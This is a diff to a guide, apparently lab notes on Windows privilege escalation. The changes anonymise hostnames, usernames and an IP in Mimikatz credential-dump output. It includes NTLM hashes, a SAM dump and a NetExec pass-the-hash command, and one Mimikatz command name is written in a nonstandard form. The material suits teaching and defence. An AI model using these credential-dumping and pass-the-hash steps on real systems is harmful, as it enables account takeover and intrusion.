@@ -208,24 +208,24 @@ Mimikatz groups output by authentication session. Each session block contains:
 Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
 Session           : RemoteInteractive from 2
 User Name         : jordan
-Domain            : WINLPE-SRV01
-Logon Server      : WINLPE-SRV01
+Domain            : SRV01
+Logon Server      : SRV01
 Logon Time        : 3/31/2021 2:59:52 PM
 SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
         msv :
          [00000003] Primary
          * Username : jordan
-         * Domain   : WINLPE-SRV01
+         * Domain   : SRV01
          * NTLM     : cf3a5525ee9414229e66279623ed5c58
          * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
         tspkg :
         wdigest :
          * Username : jordan
-         * Domain   : WINLPE-SRV01
+         * Domain   : SRV01
          * Password : (null)
         kerberos :
          * Username : jordan
-         * Domain   : WINLPE-SRV01
+         * Domain   : SRV01
          * Password : (null)
 ```
 
@@ -272,7 +272,7 @@ The leading `:` indicates no LM hash (LM is deprecated; use empty). Replace with
 Or with NetExec (formerly CrackMapExec):
 
 ```shell
-$ nxc smb 10.129.43.30 -u Administrator -H cf3a5525ee9414229e66279623ed5c58 -x whoami
+$ nxc smb 10.0.43.30 -u Administrator -H cf3a5525ee9414229e66279623ed5c58 -x whoami
 ```
 
 ## SAM database - lsadump::samprivi
@@ -284,7 +284,7 @@ With `SeDebugPrivilege` and admin context, Mimikatz can read SAM directly:
 ```cmd
 mimikatz # lsadump::samprivi
 
-Domain : ACADEMY-WINLPE-
+Domain : WIN-
 SysKey : fab4b2e32a415ea36f846b9408aa69af
 Local SID : S-1-5-21-1961621466-3413676743-2436262688
 
@@ -302,11 +302,11 @@ User : WDAGUtilityAccount
   Hash NTLM: aad797e20ba0675bbcb3e3df3319042c
 
 RID  : 000003e9 (1001)
-User : mrb3n
+User : bjones
   Hash NTLM: 7796ee39fd3a9c3a1844556115ae1a54
 
 RID  : 000003ea (1002)
-User : htb-student
+User : student
   Hash NTLM: 3c0e5d303ec84884ad5c3b7876a06ea6
 ```
 
